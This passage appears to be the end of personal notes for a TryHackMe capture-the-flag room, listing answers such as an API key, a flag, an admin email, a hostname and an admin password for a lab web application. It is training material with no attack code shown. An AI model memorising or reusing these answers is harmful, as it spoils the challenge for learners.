Password: admin_tryhackme! 

```

![[Pasted image 20230820144608.png]]

![[Pasted image 20230820145147.png]]

What is the API key that allows a user to register on the website?

*ffe60ecaa8bba2f12b43d1a4b15b8f39*

What is the first flag?

*THM{4ec9806d7e1350270dc402ba870ccebb}*

What is the email of the "admin" user?

	*admin@searchme2023cms.grep.thm*

What is the host name of the web application that allows a user to check an email for a possible password leak?

*leakchecker.grep.thm*

What is the password of the "admin" user?

*admin_tryhackme! *

[[Undiscovered]]